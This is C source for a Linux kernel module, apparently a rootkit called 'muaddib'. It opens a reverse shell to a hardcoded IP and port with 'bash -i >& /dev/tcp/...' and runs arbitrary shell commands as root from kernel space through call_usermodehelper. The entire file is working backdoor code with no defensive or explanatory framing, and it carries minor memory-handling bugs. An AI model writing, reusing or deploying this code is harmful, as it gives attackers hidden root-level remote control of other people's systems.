#include <linux/workqueue.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kmod.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define REVERSE_SHELL_IP "192.168.172.1"
#define REVERSE_SHELL_PORT "42069"

#define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
#define HOME "HOME=/root"
#define TERM "TERM=xterm-256color"
#define SHELL "/bin/bash"
#define EXEC_P1 "bash -i >& /dev/tcp/"
#define EXEC_P2 "0>&1"

struct shell_params {
	struct work_struct work;
	char* target_ip;
	char* target_port;
};

struct command_params {
    struct work_struct work;
    char* command;
};

void execute_reverse_shell(struct work_struct *work){
    int err;
    struct shell_params *params = (struct shell_params*)work;
    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL};
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    char *argv[] = {SHELL, "-c", exec, NULL};
    strcat(exec, EXEC_P1);
    strcat(exec, params->target_ip);
	strcat(exec, "/");
    strcat(exec, params->target_port);
	strcat(exec, " ");
    strcat(exec, EXEC_P2);
	#if DEBUGMSG == 1
    printk(KERN_INFO "muaddib: Starting reverse shell %s\n", exec);
	#endif

    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if(err<0){
        printk(KERN_INFO "muaddib: Error executing usermodehelper.\n");
    }
    kfree(exec);
    kfree(params->target_ip);
    kfree(params->target_port);
    kfree(params);

}

void execute_command(struct work_struct *work){
    int err;
    struct command_params *params = (struct command_params*)work;
    char *envp[] = {HOME, TERM, params->command, NULL};
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    char *argv[] = {SHELL, "-c", exec, NULL};
    strcat(exec, params->command);
    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if(err<0){
        #if DEBUGMSG == 1
        printk(KERN_INFO "muaddib: Error executing usermodehelper.\n");
        #endif
    }
    kfree(exec);
    kfree(params->command);
    kfree(params);
}

int start_command_execute(char* command){
    int err;
    struct command_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
    if(!params){
        #if DEBUGMSG == 1
        printk(KERN_INFO "muaddib: Error allocating memory\n");
		#endif
        return 1;
    }
    params->command = kstrdup(command, GFP_KERNEL);
    INIT_WORK(&params->work, &execute_command);

    err = schedule_work(&params->work);
    if(err<0){
		#if DEBUGMSG == 1
        printk(KERN_INFO "muaddib: Error scheduling work of executing command\n");
		#endif
    }
    return err;


}

int start_reverse_shell(char* ip, char* port){
    int err;
    struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
    if(!params){
		#if DEBUGMSG == 1
        printk(KERN_INFO "muaddib: Error allocating memory\n");
		#endif
        return 1;
    }
    params->target_ip = kstrdup(ip, GFP_KERNEL);
    params->target_port = kstrdup(port, GFP_KERNEL);
    INIT_WORK(&params->work, &execute_reverse_shell);

    err = schedule_work(&params->work);
    if(err<0){
		#if DEBUGMSG == 1
        printk(KERN_INFO "muaddib: Error scheduling work of starting shell\n");
		#endif
    }
    return err;

}
